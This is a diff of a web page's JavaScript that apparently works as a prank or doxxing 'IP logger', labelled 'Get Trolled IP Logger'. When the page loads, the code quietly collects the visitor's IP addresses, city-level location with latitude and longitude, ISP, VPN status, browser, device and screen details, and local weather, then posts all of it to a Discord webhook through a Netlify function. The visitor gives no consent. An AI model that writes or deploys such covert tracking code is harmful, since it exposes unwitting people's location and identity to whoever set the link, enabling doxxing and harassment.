@@ -26,7 +26,6 @@
       overflow-y: auto;
     }
   </style>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.2/ua-parser.min.js"></script>
 </head>
 <body>
   <div id="error-message" title="Click to copy error message"></div>
@@ -38,21 +37,45 @@
     return path.reduce((acc, key) => (acc && acc[key] !== undefined) ? acc[key] : defaultValue, obj);
   }
 
-  // Clip and sanitize field name/value for Discord limits & invalid characters
-  function sanitizeFieldName(name) {
+  function safeValue(val, maxLen=1024) {
+    if (val === undefined || val === null || val === '') return "N/A";
+    val = val.toString();
+    if (val.length > maxLen) return val.slice(0, maxLen - 3) + '...';
+    return val;
+  }
+
+  function safeName(name) {
     if (!name) return "N/A";
-    name = name.toString().trim();
-    if (name.length === 0) return "N/A";
-    name = name.replace(/[\u0000-\u001F\u007F]/g, ""); // remove control chars
     return name.length > 256 ? name.slice(0, 253) + "..." : name;
   }
 
-  function sanitizeFieldValue(value) {
-    if (value === undefined || value === null) return "N/A";
-    value = value.toString().trim();
-    if (value.length === 0) return "N/A";
-    value = value.replace(/[\u0000-\u001F\u007F]/g, ""); // remove control chars
-    return value.length > 1024 ? value.slice(0, 1021) + "..." : value;
+  function parseUserAgent(ua) {
+    let os = "Unknown OS";
+    let browser = "Unknown Browser";
+
+    if (/Android/.test(ua)) {
+      os = "Android";
+    } else if (/iPhone/.test(ua)) {
+      os = "iOS (iPhone)";
+    } else if (/iPad/.test(ua)) {
+      os = "iOS (iPad)";
+    } else if (/Windows NT/.test(ua)) {
+      os = "Windows";
+    } else if (/Mac OS X/.test(ua)) {
+      os = "Mac OS";
+    }
+
+    if (/Chrome\/\d+/.test(ua)) {
+      browser = "Chrome";
+    } else if (/Firefox\/\d+/.test(ua)) {
+      browser = "Firefox";
+    } else if (/Safari\/\d+/.test(ua) && !/Chrome/.test(ua)) {
+      browser = "Safari";
+    } else if (/Edg\/\d+/.test(ua)) {
+      browser = "Edge";
+    }
+
+    return { os, browser };
   }
 
   function chunkArray(arr, size) {
@@ -63,70 +86,29 @@
     return result;
   }
 
-  async function fetchFallbackGeo(ip) {
-    try {
-      const res = await fetch(`https://ipapi.co/${ip}/json/`);
-      if (!res.ok) return null;
-      return res.json();
-    } catch {
-      return null;
-    }
-  }
-
   async function fetchIPInfo() {
     const res = await fetch('https://ipwhois.app/json/');
     if (!res.ok) throw new Error('Failed to fetch IP info');
     return res.json();
   }
 
-  async function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
+  async function fetchWeather(lat, lon) {
+    if (!lat || !lon) return null;
+    const url = `https://wttr.in/${lat},${lon}?format=j1`;
+    const res = await fetch(url);
+    if (!res.ok) return null;
+    return res.json();
   }
 
-  async function sendDiscordWebhookBatched(embeds) {
-    if (!embeds || embeds.length === 0) throw new Error("No embeds to send");
-
-    const cleanEmbeds = embeds.map(embed => {
-      if (!embed.fields || embed.fields.length === 0) return embed;
-      embed.fields = embed.fields
-        .map(f => {
-          const name = sanitizeFieldName(f.name);
-          const value = sanitizeFieldValue(f.value);
-          return { name, value, inline: !!f.inline };
-        });
-      return embed;
+  async function sendDiscordWebhook(embeds) {
+    const res = await fetch(netlifyFunctionUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ embeds }),
     });
-
-    if (cleanEmbeds.length === 0) throw new Error("No valid embed fields after sanitizing");
-
-    // Chunk embeds into batches of 5 (Discord max embeds per message)
-    const embedBatches = chunkArray(cleanEmbeds, 5);
-
-    for (let i = 0; i < embedBatches.length; i++) {
-      const batch = embedBatches[i];
-      try {
-        const res = await fetch(netlifyFunctionUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ embeds: batch }),
-        });
-        if (!res.ok) {
-          const text = await res.text();
-          throw new Error(`Discord webhook error: ${res.status} - ${text}`);
-        }
-      } catch (e) {
-        const errorDiv = document.getElementById('error-message');
-        errorDiv.style.display = 'block';
-        errorDiv.textContent = `❌ Discord webhook error:\n\n${e.message}\n\nPayload:\n${JSON.stringify({ embeds: batch }, null, 2)}\n\nTap to copy`;
-        errorDiv.onclick = () => {
-          navigator.clipboard.writeText(errorDiv.textContent)
-            .then(() => alert("Error and payload copied! Send it to me."))
-            .catch(() => alert("Failed to copy."));
-        };
-        throw e;
-      }
-      // Wait 1 second between batches to avoid rate limits
-      if (i < embedBatches.length -1) await delay(1000);
+    if (!res.ok) {
+      const text = await res.text();
+      throw new Error(`Discord webhook error: ${res.status} - ${text}`);
     }
   }
 
@@ -134,71 +116,85 @@
     const errorDiv = document.getElementById('error-message');
 
     try {
-      let data = await fetchIPInfo();
-      const fallback = await fetchFallbackGeo(data.ip);
+      const data = await fetchIPInfo();
+      const weatherData = await fetchWeather(data.latitude, data.longitude);
+      const uaInfo = parseUserAgent(navigator.userAgent);
+      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone });
 
-      const parser = new UAParser();
-      const result = parser.getResult();
-
-      const deviceModel = result.device.model || "N/A";
-      const deviceType = result.device.type || "N/A";
-      const deviceVendor = result.device.vendor || "N/A";
-      const osName = result.os.name || "N/A";
-      const osVersion = result.os.version || "N/A";
-      const browserName = result.browser.name || "N/A";
-      const browserVersion = result.browser.version || "N/A";
-
-      const localTime = new Date().toLocaleString("en-US", { timeZone: data.timezone || (fallback ? fallback.timezone : undefined) });
-
-      data = {
-        ...data,
-        city: data.city || (fallback ? fallback.city : 'N/A'),
-        region: data.region || (fallback ? fallback.region : 'N/A'),
-        postal: data.postal || (fallback ? fallback.postal : 'N/A'),
-        ipv6: data.ipv6 || (fallback ? fallback.ipv6 : 'N/A'),
-        hostname: data.hostname || (fallback ? fallback.hostname : 'N/A'),
-      };
-
-      let isMobile = safeGet(data, ['security', 'is_mobile'], false);
-      if (!isMobile) {
-        const ua = navigator.userAgent.toLowerCase();
-        isMobile = /mobile|android|iphone|ipad|phone/.test(ua);
+      let weather = null;
+      if (weatherData && weatherData.current_condition && weatherData.current_condition.length > 0) {
+        weather = weatherData.current_condition[0];
       }
 
+      let weatherDescription = "N/A";
+      if (weather && weather.lang_en && Array.isArray(weather.lang_en) && weather.lang_en.length > 0) {
+        weatherDescription = weather.lang_en[0].value || "N/A";
+      }
+
+      // Prepare all fields
       const allFields = [
-        { name: "IPv4 Address", value: `\`${data.ip || "N/A"}\``, inline: true },
-        { name: "IPv6 Address", value: data.ipv6 || "N/A", inline: true },
-        { name: "Hostname", value: data.hostname || "N/A", inline: true },
-        { name: "Country", value: `${data.country || "N/A"} (${data.country_code || "N/A"})`, inline: true },
-        { name: "Region", value: data.region || "N/A", inline: true },
-        { name: "City", value: data.city || "N/A", inline: true },
-        { name: "Zip", value: data.postal || "N/A", inline: true },
-        { name: "ISP", value: data.isp || "N/A", inline: false },
-        { name: "Organization", value: data.org || "N/A", inline: false },
-        { name: "ASN", value: data.asn || "N/A", inline: true },
-        { name: "Timezone", value: `${data.timezone_gmt || "N/A"} (${data.timezone || "N/A"})`, inline: true },
-        { name: "Local Time", value: localTime || "N/A", inline: true },
-        { name: "VPN/Proxy", value: safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No", inline: true },
-        { name: "VPN/Hosting", value: safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No", inline: true },
-        { name: "Mobile", value: isMobile ? "Yes" : "No", inline: true },
-        { name: "Bot", value: safeGet(data, ['security', 'is_bot']) ? "Yes" : "No", inline: true },
-        { name: "Device Model", value: deviceModel, inline: true },
-        { name: "Device Type", value: deviceType, inline: true },
-        { name: "Device Vendor", value: deviceVendor, inline: true },
-        { name: "OS Name", value: osName, inline: true },
-        { name: "OS Version", value: osVersion, inline: true },
-        { name: "Browser Name", value: browserName, inline: true },
-        { name: "Browser Version", value: browserVersion, inline: true },
-        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
-        { name: "Screen Resolution", value: `\`${window.screen.width}×${window.screen.height} (Logical), ${Math.round(window.screen.width * window.devicePixelRatio)}×${Math.round(window.screen.height * window.devicePixelRatio)} (Physical)\``, inline: true },
+        { name: "IPv4 Address", value: `\`${safeValue(data.ip)}\``, inline: true },
+        { name: "IPv6 Address", value: safeValue(data.ipv6), inline: true },
+        { name: "Country", value: `${safeValue(data.country)} (${safeValue(data.country_code)})`, inline: true },
+        { name: "Zip", value: safeValue(data.postal), inline: true },
+        { name: "Latitude", value: safeValue(data.latitude), inline: true },
+        { name: "Longitude", value: safeValue(data.longitude), inline: true },
+        { name: "ISP", value: safeValue(data.isp), inline: false },
+        { name: "Organization", value: safeValue(data.org), inline: false },
+        { name: "ASN", value: safeValue(data.asn), inline: true },
+        { name: "Timezone", value: `${safeValue(data.timezone_gmt)} (${safeValue(data.timezone)})`, inline: true },
+        { name: "Local Time", value: safeValue(localTime), inline: true },
+        { name: "Currency", value: `${safeValue(safeGet(data, ['currency', 'code']))} (${safeValue(safeGet(data, ['currency', 'name']))})`, inline: true },
+        { name: "VPN/Proxy", value: safeValue(safeGet(data, ['security', 'is_proxy']) ? "Yes" : "No"), inline: true },
+        { name: "VPN/Hosting", value: safeValue(safeGet(data, ['security', 'is_hosting']) ? "Yes" : "No"), inline: true },
+        { name: "Bot", value: safeValue(safeGet(data, ['security', 'is_bot']) ? "Yes" : "No"), inline: true },
+        { name: "Operating System", value: safeValue(uaInfo.os), inline: true },
+        { name: "Browser", value: safeValue(uaInfo.browser), inline: true },
+        { name: "User Agent", value: `\`\`\`${safeValue(navigator.userAgent, 1000)}\`\`\``, inline: false },
+        { name: "Screen Resolution", value: `\`${safeValue(window.screen.width)}×${safeValue(window.screen.height)} (${safeValue(window.devicePixelRatio)} DPR)\``, inline: true },
       ];
 
-      const embedChunks = chunkArray(allFields, 25);
-      await sendDiscordWebhookBatched(embedChunks);
+      if(weather){
+        allFields.push(
+          { name: "Weather", value: `${safeValue(weatherDescription)} - Feels like ${safeValue(weather.FeelsLikeC)}°C`, inline: true },
+          { name: "Temperature", value: `${safeValue(weather.temp_C)}°C`, inline: true },
+          { name: "Humidity", value: `${safeValue(weather.humidity)}%`, inline: true },
+          { name: "Wind Speed", value: `${safeValue(weather.windspeedKmph)} km/h`, inline: true },
+        );
+      }
+
+      // Split fields into chunks of 25 (Discord max per embed)
+      const chunks = chunkArray(allFields, 25);
+
+      // Create embeds with chunked fields
+      const embeds = chunks.map((fieldsChunk, i) => ({
+        title: i === 0 ? "🕵️ New Visitor Logged" : undefined,
+        color: 0x00ffff,
+        timestamp: new Date().toISOString(),
+        footer: i === chunks.length -1 ? {
+          text: "Get Trolled IP Logger",
+          icon_url: "https://i.imgur.com/qZ7j0fV.png"
+        } : undefined,
+        thumbnail: i === 0 ? {
+          url: safeValue(data.country_flag, 200)
+        } : undefined,
+        author: i === 0 ? {
+          name: "Get Trolled IP Logger",
+          url: "https://discord.com",
+          icon_url: "https://i.imgur.com/qZ7j0fV.png"
+        } : undefined,
+        fields: fieldsChunk.map(f => ({
+          name: safeName(f.name),
+          value: safeValue(f.value),
+          inline: !!f.inline
+        }))
+      }));
+
+      await sendDiscordWebhook(embeds);
 
     } catch (err) {
-      errorDiv.style.display = 'block';
-      errorDiv.textContent = `❌ Error: ${err.message}\n\nTap to copy`;
+      errorDiv.style.display = "block";
+      errorDiv.textContent = `Error:\n${err.message}\n\nClick to copy error message.`;
       errorDiv.onclick = () => {
         navigator.clipboard.writeText(err.message)
           .then(() => alert("Error message copied! Send it to me."))
